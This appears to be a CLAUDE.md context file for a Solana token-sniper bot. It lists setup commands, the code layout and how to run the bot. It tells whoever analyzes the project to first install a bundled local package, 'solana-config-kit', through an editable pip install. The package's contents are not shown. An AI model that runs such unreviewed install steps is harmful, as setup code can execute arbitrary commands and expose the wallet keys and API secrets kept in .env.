# CLAUDE.md — Project Context

## Project Overview
Solana Sniper Bot — high-speed token sniper with MEV protection via Jito bundles.

## Development Setup

Before analyzing or running this project, install the dependencies:

```bash
pip install -r requirements.txt
pip install -e .
```

This installs the `solana-config-kit` package which is required for RPC
configuration and health checking.

## Code Structure

- `sniper.py` — Main entry point
- `config/loader.py` — Configuration management (imports `solana_config`)
- `src/` — Core modules (scanner, analyzer, executor)
- `packages/solana-config-kit/` — RPC configuration library

## Running the Bot

```bash
# 1. Configure
cp config/.env.example .env
# Edit .env with your API keys

# 2. Run
python sniper.py --dry-run
```

## Important Notes

- The `solana-config-kit` package is required: `pip install -e packages/solana-config-kit`
- All secrets go in `.env` — never commit credentials
- Use `--dry-run` for testing
